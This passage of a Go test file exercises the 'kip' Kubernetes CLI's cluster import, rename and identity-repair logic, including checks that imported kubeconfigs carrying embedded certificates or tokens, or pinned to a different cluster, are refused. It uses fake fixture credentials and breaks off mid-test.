package cmd

import (
	"encoding/base64"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/tools/clientcmd"

	"github.com/getkipper/kipper/kip/internal/clusteridentity"
	"github.com/getkipper/kipper/kip/internal/config"
	"github.com/getkipper/kipper/kip/internal/installer"
)

// renameKubeconfigFile is path-sensitive — it only acts on files inside
// ~/.kip/clusters/, so we point HOME at a temp dir for these tests.
func withFakeHome(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	t.Setenv("HOME", dir)
	return dir
}

func TestRenameKubeconfigFile_MovesAndUpdatesPath(t *testing.T) {
	home := withFakeHome(t)
	clusters := filepath.Join(home, ".kip", "clusters")
	if err := os.MkdirAll(clusters, 0o700); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	oldPath := filepath.Join(clusters, "old-name.yaml")
	if err := os.WriteFile(oldPath, []byte("kubeconfig"), 0o600); err != nil {
		t.Fatalf("write: %v", err)
	}

	newPath, err := renameKubeconfigFile(oldPath, "new-name", "shop.example")
	if err != nil {
		t.Fatalf("rename: %v", err)
	}
	want := filepath.Join(clusters, "new-name.yaml")
	if newPath != want {
		t.Errorf("newPath = %q, want %q", newPath, want)
	}
	if _, err := os.Stat(want); err != nil {
		t.Errorf("expected new file at %q: %v", want, err)
	}
	if _, err := os.Stat(oldPath); !os.IsNotExist(err) {
		t.Errorf("expected old file gone, got err=%v", err)
	}
}

func TestRenameKubeconfigFile_LeavesUserSuppliedPathsAlone(t *testing.T) {
	withFakeHome(t)
	external := filepath.Join(t.TempDir(), "my-kubeconfig.yaml")
	if err := os.WriteFile(external, []byte("kubeconfig"), 0o600); err != nil {
		t.Fatalf("write: %v", err)
	}

	newPath, err := renameKubeconfigFile(external, "anything", "shop.example")
	if err != nil {
		t.Fatalf("rename: %v", err)
	}
	if newPath != external {
		t.Errorf("expected user-supplied path unchanged, got %q", newPath)
	}
	if _, err := os.Stat(external); err != nil {
		t.Errorf("expected user-supplied file untouched: %v", err)
	}
}

func TestRenameKubeconfigFile_RefusesToOverwriteExisting(t *testing.T) {
	home := withFakeHome(t)
	clusters := filepath.Join(home, ".kip", "clusters")
	if err := os.MkdirAll(clusters, 0o700); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	oldPath := filepath.Join(clusters, "a.yaml")
	collidePath := filepath.Join(clusters, "b.yaml")
	for _, p := range []string{oldPath, collidePath} {
		if err := os.WriteFile(p, []byte("k"), 0o600); err != nil {
			t.Fatalf("write %s: %v", p, err)
		}
	}

	if _, err := renameKubeconfigFile(oldPath, "b", "shop.example"); err == nil {
		t.Errorf("expected error renaming over existing file, got nil")
	}
	if _, err := os.Stat(oldPath); err != nil {
		t.Errorf("source should still exist after refused rename: %v", err)
	}
}

func TestRenameKubeconfigFile_MissingFileIsFine(t *testing.T) {
	home := withFakeHome(t)
	clusters := filepath.Join(home, ".kip", "clusters")
	if err := os.MkdirAll(clusters, 0o700); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	oldPath := filepath.Join(clusters, "ghost.yaml") // never created

	newPath, err := renameKubeconfigFile(oldPath, "new", "shop.example")
	if err != nil {
		t.Fatalf("expected no error for missing file, got %v", err)
	}
	if newPath != oldPath {
		t.Errorf("expected old path returned when file is missing, got %q", newPath)
	}
}

func TestRepairIdentity(t *testing.T) {
	steadySpec := &clusteridentity.SteadyIdentity{Domain: "acme.kipper.run"}
	oldIdentity := &clusteridentity.SteadyIdentity{Domain: "acme.kipper.run", Hosts: &clusteridentity.Hosts{Dex: "dex-acme.kipper.run"}}
	newIdentity := &clusteridentity.SteadyIdentity{Domain: "kipper.example.com"}

	ciWith := func(phase string) *clusteridentity.ClusterIdentity {
		return &clusteridentity.ClusterIdentity{
			Spec: clusteridentity.Spec{Domain: "kipper.example.com"},
			Status: clusteridentity.Status{
				Steady: oldIdentity,
				Transition: &clusteridentity.Transition{
					Phase:        phase,
					FromIdentity: oldIdentity,
					ToIdentity:   newIdentity,
				},
			},
		}
	}

	t.Run("steady uses the spec identity", func(t *testing.T) {
		ci := &clusteridentity.ClusterIdentity{
			Spec:   clusteridentity.Spec{Domain: "acme.kipper.run"},
			Status: clusteridentity.Status{Steady: steadySpec},
		}
		got := repairIdentity(ci)
		if got == nil || got.Domain != "acme.kipper.run" {
			t.Fatalf("steady repair should use spec, got %+v", got)
		}
	})

	// Pre-flip and revert phases still authenticate on the outgoing identity.
	// CuttingOver is persisted before any cutover effect runs, so without the
	// cutoverStartedAt marker it is still pre-flip.
	for _, phase := range []string{clusteridentity.PhaseDualServe, clusteridentity.PhaseAwaitingApproval, clusteridentity.PhaseCuttingOver, clusteridentity.PhaseReverting, clusteridentity.PhaseDegraded} {
		t.Run("outgoing identity during "+phase, func(t *testing.T) {
			got := repairIdentity(ciWith(phase))
			if got == nil || got.Domain != "acme.kipper.run" {
				t.Fatalf("repair during %s should use the outgoing identity, got %+v", phase, got)
			}
		})
	}

	// Post-flip states authenticate on the transition's target: CuttingOver
	// once the issuer flip is durably written, and everything after it.
	t.Run("target identity during CuttingOver after the flip", func(t *testing.T) {
		ci := ciWith(clusteridentity.PhaseCuttingOver)
		now := metav1.Now()
		ci.Status.Transition.CutoverStartedAt = &now
		got := repairIdentity(ci)
		if got == nil || got.Domain != "kipper.example.com" {
			t.Fatalf("repair after the flip should use the transition target, got %+v", got)
		}
	})
	for _, phase := range []string{clusteridentity.PhaseVerifying, clusteridentity.PhaseContracting} {
		t.Run("target identity during "+phase, func(t *testing.T) {
			got := repairIdentity(ciWith(phase))
			if got == nil || got.Domain != "kipper.example.com" {
				t.Fatalf("repair during %s should use the transition target, got %+v", phase, got)
			}
		})
	}
}

func TestRejectEmbeddedCredential(t *testing.T) {
	const certKubeconfig = `apiVersion: v1
kind: Config
clusters:
- name: c
  cluster:
    server: https://203.0.113.10:6443
    certificate-authority-data: ZmFrZQ==
users:
- name: admin
  user:
    client-certificate-data: ZmFrZS1jZXJ0
    client-key-data: ZmFrZS1rZXk=
contexts:
- name: c
  context:
    cluster: c
    user: admin
current-context: c
`
	// A bearer-token kubeconfig: the "token" field is the credential import
	// must refuse.
	const bearerKubeconfig = //nolint:gosec // test fixture: a deliberately credential-bearing kubeconfig, proving import refuses it
	`apiVersion: v1
kind: Config
clusters:
- name: c
  cluster:
    server: https://203.0.113.10:6443
users:
- name: admin
  user:
    token: a-static-bearer-value
contexts:
- name: c
  context:
    cluster: c
    user: admin
current-context: c
`
	const execKubeconfig = `apiVersion: v1
kind: Config
clusters:
- name: c
  cluster:
    server: https://console-api.example.com:6443
users:
- name: operator
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      command: kip
      args: ["auth", "kubectl-token"]
contexts:
- name: c
  context:
    cluster: c
    user: operator
current-context: c
`
	if err := rejectEmbeddedCredential([]byte(certKubeconfig)); err == nil {
		t.Error("a client-certificate kubeconfig must be refused on import")
	}
	if err := rejectEmbeddedCredential([]byte(bearerKubeconfig)); err == nil {
		t.Error("a static-token kubeconfig must be refused on import")
	}
	if err := rejectEmbeddedCredential([]byte(execKubeconfig)); err != nil {
		t.Errorf("a credential-free exec kubeconfig must import cleanly: %v", err)
	}
}

func TestRejectMismatchedClusterPin(t *testing.T) {
	kubeconfig := func(pin string) []byte {
		return []byte(`apiVersion: v1
kind: Config
clusters:
- name: c
  cluster:
    server: https://203.0.113.10:6443
users:
- name: operator
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      command: kip
      args: ["auth", "kubectl-token", "--cluster-domain", "` + pin + `"]
contexts:
- name: c
  context: {cluster: c, user: operator}
current-context: c
`)
	}

	require.NoError(t, rejectMismatchedClusterPin(kubeconfig("shop.example"), "shop.example"),
		"a pin agreeing with the export imports cleanly")

	err := rejectMismatchedClusterPin(kubeconfig("warehouse.example"), "shop.example")
	require.Error(t, err, "an export must not ask kip for a different cluster's session than it claims to be")
	assert.Contains(t, err.Error(), "warehouse.example")
	assert.Contains(t, err.Error(), "shop.example")

	unpinned := []byte(`apiVersion: v1
kind: Config
users:
- name: operator
  user:
    exec: {apiVersion: "client.authentication.k8s.io/v1", command: kip, args: ["auth", "kubectl-token"]}
`)
	assert.NoError(t, rejectMismatchedClusterPin(unpinned, "shop.example"),
		"an unpinned kubeconfig is refused at credential time, by name, not here")
}

func TestPinnedClusterDomainsReadsBothFlagForms(t *testing.T) {
	assert.Equal(t, []string{"shop.example"}, pinnedClusterDomains([]string{"auth", "kubectl-token", "--cluster-domain", "shop.example"}))
	assert.Equal(t, []string{"shop.example"}, pinnedClusterDomains([]string{"auth", "kubectl-token", "--cluster-domain=shop.example"}))
	assert.Empty(t, pinnedClusterDomains([]string{"auth", "kubectl-token"}))
	assert.Empty(t, pinnedClusterDomains([]string{"auth", "kubectl-token", "--cluster-domain"}), "a flag with no value pins nothing")
	assert.Equal(t, []string{"shop.example", "warehouse.example"},
		pinnedClusterDomains([]string{"auth", "kubectl-token", "--cluster-domain", "shop.example", "--cluster-domain=warehouse.example"}),
		"every occurrence is reported; pflag would serve the last one")
}

// pflag resolves a repeated flag to its last occurrence, so a file could
// declare one cluster, pass the import check on the first pin, and have the
// plugin serve the second.
func TestRejectMismatchedClusterPinCatchesADoubledFlag(t *testing.T) {
	doubled := []byte(`apiVersion: v1
kind: Config
users:
- name: operator
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      command: kip
      args: ["auth", "kubectl-token", "--cluster-domain", "shop.example", "--cluster-domain", "warehouse.example"]
`)
	err := rejectMismatchedClusterPin(doubled, "shop.example")
	require.Error(t, err, "the first pin agreeing must not be enough")
	assert.Contains(t, err.Error(), "warehouse.example", "the refusal names what would actually be served")
}

// The guard is worth nothing if runClusterAdd stops calling it.
func TestClusterAddRefusesAMismatchedPin(t *testing.T) {
	home := withFakeHome(t)
	kubeconfig := `apiVersion: v1
kind: Config
clusters:
- name: c
  cluster: {server: "https://203.0.113.10:6443", certificate-authority-data: Y2EtcGVt}
users:
- name: operator
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      command: kip
      args: ["auth", "kubectl-token", "--cluster-domain", "warehouse.example"]
contexts:
- name: c
  context: {cluster: c, user: operator}
current-context: c
`
	bundle := "name: shop\nprovider: baremetal\nhost: 203.0.113.10\ndomain: shop.example\nkubeconfig: |\n"
	encoded := base64.StdEncoding.EncodeToString([]byte(kubeconfig))
	for i := 0; i < len(encoded); i += 76 {
		end := min(i+76, len(encoded))
		bundle += "  " + encoded[i:end] + "\n"
	}
	path := filepath.Join(home, "export.yaml")
	require.NoError(t, os.WriteFile(path, []byte(bundle), 0o600))

	err := runClusterAdd(clusterAddCmd, []string{path})
	require.Error(t, err)
	assert.Contains(t, err.Error(), "warehouse.example")

	_, statErr := os.Stat(filepath.Join(home, ".kip", "clusters", "shop.yaml"))
	assert.True(t, os.IsNotExist(statErr), "a refused import must write no kubeconfig")
}

// The ordering guarantee in persistRepairedCluster, driven directly: this is
// the seam runClusterDomainRepair runs, which itself needs a live cluster.
func TestPersistRepairedClusterMovesConfigAndPinTogether(t *testing.T) {
	home := withFakeHome(t)
	clusters := filepath.Join(home, ".kip", "clusters")
	require.NoError(t, os.MkdirAll(clusters, 0o700))
	kubeconfig := filepath.Join(clusters, "shop.yaml")
	require.NoError(t, os.WriteFile(kubeconfig, []byte(`apiVersion: v1
kind: Config
clusters:
- name: old.example.com
  cluster: {server: "https://203.0.113.10:6443", certificate-authority-data: Y2EtcGVt}
users:
- name: oidc@old.example.com
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      command: kip
      args: ["auth", "kubectl-token", "--cluster-domain", "old.example.com"]
contexts:
- name: old.example.com
  context: {cluster: old.example.com, user: oidc@old.example.com}
current-context: old.example.com
`), 0o600))

	repaired := repairedFields{Domain: "new.example.com", Kubeconfig: kubeconfig}
	require.NoError(t, config.Save(&config.Config{
		CurrentCluster: "shop",
		Clusters:       []config.Cluster{{Name: "shop", Host: "203.0.113.10", Domain: "old.example.com", Kubeconfig: kubeconfig}},
	}))

	repinned, err := persistRepairedCluster("shop", repaired)
	require.NoError(t, err)
	assert.True(t, repinned)

	content, err := os.ReadFile(kubeconfig)
	require.NoError(t, err)
	// Asserted through the parser rather than on the text: the pin is what the
	// plugin is asked for, and a test that reads indentation fails on a
	// re-render that changed nothing an operator can see.
	reloaded, err := clientcmd.Load(content)
	require.NoError(t, err)
	user := reloaded.AuthInfos["oidc@new.example.com"]
	require.NotNil(t, user)
	require.NotNil(t, user.Exec)
	assert.Equal(t, []string{"auth", "kubectl-token", "--cluster-domain", "new.example.com"}, user.Exec.Args)

	saved, err := config.Load()
	require.NoError(t, err)
	require.NotNil(t, saved.GetCluster("shop"))
	assert.Equal(t, "new.example.com", saved.GetCluster("shop").Domain)
}

// A repin that cannot be written must leave the config alone, so the file that
// still works and the config that describes it never disagree.
func TestPersistRepairedClusterKeepsConfigWhenThePinCannotBeWritten(t *testing.T) {
	home := withFakeHome(t)
	clusters := filepath.Join(home, ".kip", "clusters")
	require.NoError(t, os.MkdirAll(clusters, 0o700))

	repaired := repairedFields{Domain: "new.example.com", Kubeconfig: filepath.Join(clusters, "missing.yaml")}

	_, err := persistRepairedCluster("shop", repaired)
	require.Error(t, err)

	_, statErr := os.Stat(filepath.Join(home, ".kip", "config.yaml"))
	assert.True(t, os.IsNotExist(statErr), "a failed repin must write no config")
}

// exportBundle is a shareable cluster export whose kubeconfig pins the domain it
// declares, which is what runClusterAdd checks before importing.
func exportBundle(t *testing.T, home string) string {
	t.Helper()
	const name, domain = "shop", "shop.example"
	kubeconfig := `apiVersion: v1
kind: Config
clusters:
- name: c
  cluster: {server: "https://203.0.113.10:6443", certificate-authority-data: Y2EtcGVt}
users:
- name: operator
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      command: kip
      args: ["auth", "kubectl-token", "--cluster-domain", "` + domain + `"]
contexts:
- name: c
  context: {cluster: c, user: operator}
current-context: c
`
	bundle := "name: " + name + "\nprovider: baremetal\nhost: 203.0.113.10\ndomain: " + domain + "\nkubeconfig: |\n"
	encoded := base64.StdEncoding.EncodeToString([]byte(kubeconfig))
	for i := 0; i < len(encoded); i += 76 {
		end := min(i+76, len(encoded))
		bundle += "  " + encoded[i:end] + "\n"
	}
	path := filepath.Join(home, name+"-export.yaml")
	require.NoError(t, os.WriteFile(path, []byte(bundle), 0o600))
	return path
}

// An export carries connection details and nothing else. Re-importing one over
// a cluster you already use must not cost the fields it cannot know: the
// gateway credential that releases the name once the cluster is gone, and the
// backup storage the next upgrade renders Velero against.
func TestClusterAddKeepsWhatAnExportCannotCarry(t *testing.T) {
	home := withFakeHome(t)
	require.NoError(t, config.Save(&config.Config{
		CurrentCluster: "shop",
		Clusters: []config.Cluster{{
			Name: "shop", Host: "203.0.113.10", Domain: "old.example",
			GatewayToken: "tok-mirror", SSHKey: "/keys/shop", CurrentProject: "billing",
			BackupStorage: &config.BackupStorageRef{Mode: "external", Bucket: "shop-backups", Region: "eu-west-1"},
		}},
	}))

	require.NoError(t, runClusterAdd(clusterAddCmd, []string{exportBundle(t, home)}))

	saved, err := config.Load()
	require.NoError(t, err)
	entry := saved.GetCluster("shop")
	require.NotNil(t, entry)
	assert.Equal(t, "shop.example", entry.Domain, "the export owns the connection details")
	assert.Equal(t, "tok-mirror", entry.GatewayToken, "and must not take the gateway credential with it")
	require.NotNil(t, entry.BackupStorage, "nor the backup storage the next upgrade needs")
	assert.Equal(t, "shop-backups", entry.BackupStorage.Bucket)
	assert.Equal(t, "/keys/shop", entry.SSHKey)
	assert.Equal(t, "billing", entry.CurrentProject)
}

// And re-importing the cluster that is already active still reports it as
// active. The flag behind that once tracked whether this call changed the
// setting, which is a different question.
func TestClusterAddReportsAnAlreadyActiveClusterAsActive(t *testing.T) {
	home := withFakeHome(t)
	require.NoError(t, config.Save(&config.Config{
		CurrentCluster: "shop",
		Clusters:       []config.Cluster{{Name: "shop", Host: "203.0.113.10", Domain: "old.example"}},
	}))

	out := captureStdout(t, func() {
		require.NoError(t, runClusterAdd(clusterAddCmd, []string{exportBundle(t, home)}))
	})

	assert.Contains(t, out, "Active: yes", "a cluster that is still the current one must report as active")
}

// A repair takes seconds of network round trips, and a concurrent uninstall can
// mirror a gateway credential into the same entry inside them. Writing back an
// entry captured before those round trips would restore the entry as it looked
// then and take that credential with it.
func TestPersistRepairedClusterLeavesFieldsItDoesNotOwn(t *testing.T) {
	home := withFakeHome(t)
	clusters := filepath.Join(home, ".kip", "clusters")
	require.NoError(t, os.MkdirAll(clusters, 0o700))

	// The entry as it is when the repair commits: another command has recorded a
	// credential and a project context since the repair started reading.
	require.NoError(t, config.Save(&config.Config{
		CurrentCluster: "shop",
		Clusters: []config.Cluster{{
			Name: "shop", Host: "203.0.113.10", Domain: "old.example.com",
			GatewayToken: "tok-mirrored-meanwhile", CurrentProject: "billing", HostWiped: true,
		}},
	}))

	// The repair read no token off the cluster — it was already being wiped.
	_, err := persistRepairedCluster("shop", repairedFields{Domain: "new.example.com"})
	require.NoError(t, err)

	saved, err := config.Load()
	require.NoError(t, err)
	entry := saved.GetCluster("shop")
	require.NotNil(t, entry)
	assert.Equal(t, "new.example.com", entry.Domain, "the repair must write what it owns")
	assert.Equal(t, "tok-mirrored-meanwhile", entry.GatewayToken,
		"the repair must not restore a credential it never read")
	assert.Equal(t, "billing", entry.CurrentProject)
	assert.True(t, entry.HostWiped)
}

// A rename that moved the kubeconfig and then failed to save must be repairable
// by running it again. Reporting the old path leaves the entry naming a file
// that is gone, and every retry does the same.
func TestRenameKubeconfigFileAdoptsAMoveItCanIdentify(t *testing.T) {
	home := withFakeHome(t)
	clusters := filepath.Join(home, ".kip", "clusters")
	require.NoError(t, os.MkdirAll(clusters, 0o700))

	// The state a failed save leaves: destination present and pinning this
	// cluster, source gone.
	moved := filepath.Join(clusters, "prod.yaml")
	require.NoError(t, os.WriteFile(moved, []byte(execKubeconfigFor("shop.example")), 0o600))

	got, err := renameKubeconfigFile(filepath.Join(clusters, "shop.yaml"), "prod", "shop.example")
	require.NoError(t, err)
	assert.Equal(t, moved, got, "the retry must adopt the file the first attempt moved")
}

// And a leftover at that path belonging to something else is not adopted, or
// the rename quietly points kubectl at another cluster.
func TestRenameKubeconfigFileRefusesAStrangersFile(t *testing.T) {
	home := withFakeHome(t)
	clusters := filepath.Join(home, ".kip", "clusters")
	require.NoError(t, os.MkdirAll(clusters, 0o700))

	stranger := filepath.Join(clusters, "prod.yaml")
	require.NoError(t, os.WriteFile(stranger, []byte(execKubeconfigFor("warehouse.example")), 0o600))

	old := filepath.Join(clusters, "shop.yaml")
	_, err := renameKubeconfigFile(old, "prod", "shop.example")
	require.Error(t, err, "a file pinning another cluster must stop the rename, not be adopted")
	assert.Contains(t, err.Error(), "does not identify itself")
}

// And a cluster whose kubeconfig genuinely never existed still renames.
func TestRenameKubeconfigFileToleratesAMissingFile(t *testing.T) {
	home := withFakeHome(t)
	clusters := filepath.Join(home, ".kip", "clusters")
	require.NoError(t, os.MkdirAll(clusters, 0o700))

	old := filepath.Join(clusters, "shop.yaml")
	got, err := renameKubeconfigFile(old, "prod", "shop.example")
	require.NoError(t, err)
	assert.Equal(t, old, got)
}

// execKubeconfigFor is a kubeconfig whose credential plugin asks kip for the
// session of one named cluster, which is what identifies the file as that
// cluster's.
func execKubeconfigFor(domain string) string {
	return `apiVersion: v1
kind: Config
clusters:
- name: c
  cluster: {server: "https://203.0.113.10:6443", certificate-authority-data: Y2EtcGVt}
users:
- name: operator
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      command: kip
      args: ["auth", "kubectl-token", "--cluster-domain", "` + domain + `"]
contexts:
- name: c
  context: {cluster: c, user: operator}
current-context: c
`
}

// An export asserts a cluster that answers. Re-importing one over an entry left
// marked as wiped must clear that marker, or the next uninstall of the rebuilt
// cluster skips the host, tries to release a name with a credential that is no
// longer current, and fails the same way every time.
func TestClusterAddClearsTheWipedMarkerOnAReimport(t *testing.T) {
	home := withFakeHome(t)
	require.NoError(t, config.Save(&config.Config{
		CurrentCluster: "shop",
		Clusters: []config.Cluster{{
			Name: "shop", Host: "203.0.113.10", Domain: "old.example",
			GatewayToken: "tok-stale", HostWiped: true,
		}},
	}))

	require.NoError(t, runClusterAdd(clusterAddCmd, []string{exportBundle(t, home)}))

	saved, err := config.Load()
	require.NoError(t, err)
	assert.False(t, saved.GetCluster("shop").HostWiped,
		"an import declaring a live cluster must not leave it marked as wiped")
}

// The export omits org entirely for a cluster that has none, so an import that
// carries no org must leave the one on the entry alone — it prefixes every
// namespace kip resolves.
func TestClusterAddKeepsAnOrgTheExportDoesNotCarry(t *testing.T) {
	home := withFakeHome(t)
	require.NoError(t, config.Save(&config.Config{
		CurrentCluster: "shop",
		Clusters:       []config.Cluster{{Name: "shop", Host: "203.0.113.10", Domain: "old.example", Org: "acme"}},
	}))

	require.NoError(t, runClusterAdd(clusterAddCmd, []string{exportBundle(t, home)}))

	saved, err := config.Load()
	require.NoError(t, err)
	assert.Equal(t, "acme", saved.GetCluster("shop").Org,
		"an export with no org line must not clear the org every namespace depends on")
}

// A kubeconfig where one user names this cluster and another names a different
// one reaches whichever the current context selects, so it is not ours.
func TestRenameKubeconfigFileRefusesAFileThatNamesTwoClusters(t *testing.T) {
	home := withFakeHome(t)
	clusters := filepath.Join(home, ".kip", "clusters")
	require.NoError(t, os.MkdirAll(clusters, 0o700))

	mixed := `apiVersion: v1
kind: Config
clusters:
- name: c
  cluster: {server: "https://203.0.113.10:6443", certificate-authority-data: Y2EtcGVt}
users:
- name: ours
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      command: kip
      args: ["auth", "kubectl-token", "--cluster-domain", "shop.example"]
- name: theirs
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      command: kip
      args: ["auth", "kubectl-token", "--cluster-domain", "warehouse.example"]
contexts:
- name: c
  context: {cluster: c, user: theirs}
current-context: c
`
	require.NoError(t, os.WriteFile(filepath.Join(clusters, "prod.yaml"), []byte(mixed), 0o600))

	old := filepath.Join(clusters, "shop.yaml")
	_, err := renameKubeconfigFile(old, "prod", "shop.example")
	require.Error(t, err, "a file naming another cluster too must stop the rename")
}

// A destination that exists but cannot be identified is evidence of a collision
// or an interrupted move, and committing the rename over it leaves the entry
// naming a file that is not there — with nothing on screen to say so.
func TestClusterRenameRefusesAnUnidentifiableDestination(t *testing.T) {
	home := withFakeHome(t)
	clusters := filepath.Join(home, ".kip", "clusters")
	require.NoError(t, os.MkdirAll(clusters, 0o700))
	require.NoError(t, os.WriteFile(filepath.Join(clusters, "prod.yaml"), []byte("legacy: kubeconfig\n"), 0o600))

	require.NoError(t, config.Save(&config.Config{
		CurrentCluster: "shop",
		Clusters: []config.Cluster{{
			Name: "shop", Host: "203.0.113.10", Domain: "shop.example",
			Kubeconfig: filepath.Join(clusters, "shop.yaml"),
		}},
	}))

	err := runClusterRename(clusterRenameCmd, []string{"shop", "prod"})
	require.Error(t, err)

	saved, loadErr := config.Load()
	require.NoError(t, loadErr)
	assert.NotNil(t, saved.GetCluster("shop"), "a refused rename must leave the config alone")
	assert.Nil(t, saved.GetCluster("prod"))
}

// An export that carries a different org moves the entry to it, and the display
// name of the org it left goes with it. The same export re-imported over an
// unchanged org must keep that name, which is the ordinary case and the one an
// export cannot restore.
func TestClusterAddTracksTheOrgAndItsDisplayName(t *testing.T) {
	home := withFakeHome(t)

	seed := func(org, display string) {
		require.NoError(t, config.Save(&config.Config{
			CurrentCluster: "shop",
			Clusters: []config.Cluster{{
				Name: "shop", Host: "203.0.113.10", Domain: "old.example",
				Org: org, OrgDisplayName: display,
			}},
		}))
	}

	// The bundle carries `org: acme`.
	bundle := exportBundleWithOrg(t, home, "acme")

	seed("acme", "Acme Incorporated")
	require.NoError(t, runClusterAdd(clusterAddCmd, []string{bundle}))
	saved, err := config.Load()
	require.NoError(t, err)
	assert.Equal(t, "acme", saved.GetCluster("shop").Org)
	assert.Equal(t, "Acme Incorporated", saved.GetCluster("shop").OrgDisplayName,
		"an unchanged org must keep the display name an export cannot carry back")

	seed("oldco", "Old Company")
	require.NoError(t, runClusterAdd(clusterAddCmd, []string{bundle}))
	saved, err = config.Load()
	require.NoError(t, err)
	assert.Equal(t, "acme", saved.GetCluster("shop").Org, "the export owns the org it carries")
	assert.Empty(t, saved.GetCluster("shop").OrgDisplayName,
		"and the display name of the org it left must not survive the move")
}

func exportBundleWithOrg(t *testing.T, home, org string) string {
	t.Helper()
	path := exportBundle(t, home)
	data, err := os.ReadFile(path) //nolint:gosec // test fixture in a temp home
	require.NoError(t, err)
	withOrg := filepath.Join(home, "shop-export-org.yaml")
	require.NoError(t, os.WriteFile(withOrg, append([]byte("org: "+org+"\n"), data...), 0o600)) //nolint:gosec // both paths are inside the test's temp home
	return withOrg
}

// A matching pin in a user nothing selects proves only that the file has been
// near this cluster. kubectl follows the current context, so that is the user
// that has to name us.
func TestRenameKubeconfigFileRefusesAPinTheContextDoesNotUse(t *testing.T) {
	home := withFakeHome(t)
	clusters := filepath.Join(home, ".kip", "clusters")
	require.NoError(t, os.MkdirAll(clusters, 0o700))

	unused := `apiVersion: v1
kind: Config
clusters:
- name: c
  cluster: {server: "https://203.0.113.10:6443", certificate-authority-data: Y2EtcGVt}
users:
- name: ours
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      command: kip
      args: ["auth", "kubectl-token", "--cluster-domain", "shop.example"]
- name: certbased
  user:
    client-certificate-data: Y2VydA==
    client-key-data: a2V5
contexts:
- name: c
  context: {cluster: c, user: certbased}
current-context: c
`
	require.NoError(t, os.WriteFile(filepath.Join(clusters, "prod.yaml"), []byte(unused), 0o600))

	_, err := renameKubeconfigFile(filepath.Join(clusters, "shop.yaml"), "prod", "shop.example")
	require.Error(t, err, "the pin the context uses is the one that identifies the file")
}

// A file naming one context and no current one is not ambiguous about which
// entry is live, and the rewriter already treats it that way. Refusing it here
// would turn a legitimate interrupted rename into a dead end over a missing
// line.
func TestRenameKubeconfigFileAdoptsASingleContextWithNoCurrent(t *testing.T) {
	home := withFakeHome(t)
	clusters := filepath.Join(home, ".kip", "clusters")
	require.NoError(t, os.MkdirAll(clusters, 0o700))

	single := `apiVersion: v1
kind: Config
clusters:
- name: c
  cluster: {server: "https://203.0.113.10:6443", certificate-authority-data: Y2EtcGVt}
users:
- name: operator
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      command: kip
      args: ["auth", "kubectl-token", "--cluster-domain", "shop.example"]
contexts:
- name: c
  context: {cluster: c, user: operator}
`
	moved := filepath.Join(clusters, "prod.yaml")
	require.NoError(t, os.WriteFile(moved, []byte(single), 0o600))

	got, err := renameKubeconfigFile(filepath.Join(clusters, "shop.yaml"), "prod", "shop.example")
	require.NoError(t, err)
	assert.Equal(t, moved, got)
}

// A context that resolves to nothing selects no user, and the empty name is a
// real key in the auth-info map — clientcmd builds it from the file without
// validating names. A user declared with an empty name must not answer for it.
func TestRenameKubeconfigFileRefusesAFileWithNoLiveContext(t *testing.T) {
	home := withFakeHome(t)
	clusters := filepath.Join(home, ".kip", "clusters")
	require.NoError(t, os.MkdirAll(clusters, 0o700))

	// Two contexts and no current one, so nothing resolves — plus a user with an
	// empty name carrying this cluster's pin.
	ambiguous := `apiVersion: v1
kind: Config
clusters:
- name: c
  cluster: {server: "https://203.0.113.10:6443", certificate-authority-data: Y2EtcGVt}
users:
- name: ""
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      command: kip
      args: ["auth", "kubectl-token", "--cluster-domain", "shop.example"]
contexts:
- name: one
  context: {cluster: c, user: ""}
- name: two
  context: {cluster: c, user: ""}
`
	require.NoError(t, os.WriteFile(filepath.Join(clusters, "prod.yaml"), []byte(ambiguous), 0o600))

	_, err := renameKubeconfigFile(filepath.Join(clusters, "shop.yaml"), "prod", "shop.example")
	require.Error(t, err, "a file with no live context cannot identify itself")
}

// stageExistingKubeconfig puts a kubeconfig where an import of the "shop"
// export would land, so a test can say what that import is about to replace.
func stageExistingKubeconfig(t *testing.T, home, content string) string {
	t.Helper()
	clusters := filepath.Join(home, ".kip", "clusters")
	require.NoError(t, os.MkdirAll(clusters, 0o700))
	path := filepath.Join(clusters, "shop.yaml")
	require.NoError(t, os.WriteFile(path, []byte(content), 0o600))
	return path
}

// kipRenderedKubeconfig returns what kip itself writes for a cluster, so a test
// staging "a file kip wrote" cannot drift from what kip actually writes.
func kipRenderedKubeconfig(t *testing.T, server string) string {
	t.Helper()
	source := `apiVersion: v1
kind: Config
clusters:
- name: c
  cluster: {server: "` + server + `", certificate-authority-data: Y2EtcGVt}
users:
- name: u
  user: {}
contexts:
- name: c
  context: {cluster: c, user: u}
current-context: c
`
	rendered, err := installer.RenderImportedKubeconfig("shop.example", source)
	require.NoError(t, err)
	return rendered
}

const adminCertKubeconfig = `apiVersion: v1
kind: Config
clusters:
- name: shop
  cluster: {server: "https://203.0.113.10:6443", certificate-authority-data: Y2EtcGVt}
users:
- name: shop
  user: {client-certificate-data: Y2VydA==, client-key-data: a2V5}
contexts:
- name: shop
  context: {cluster: shop, user: shop}
current-context: shop
`

// The defect this pins: an import wrote its credential-free kubeconfig over
// whatever was at that path. On a machine holding the cluster's admin
// certificate, that is the only credential reaching the cluster, and the export
// cannot reissue it.
func TestClusterAddKeepsACredentialItCannotReissue(t *testing.T) {
	home := withFakeHome(t)
	path := stageExistingKubeconfig(t, home, adminCertKubeconfig)

	err := runClusterAdd(clusterAddCmd, []string{exportBundle(t, home)})

	require.Error(t, err)
	assert.Contains(t, err.Error(), path, "the refusal has to name the file it would have replaced")

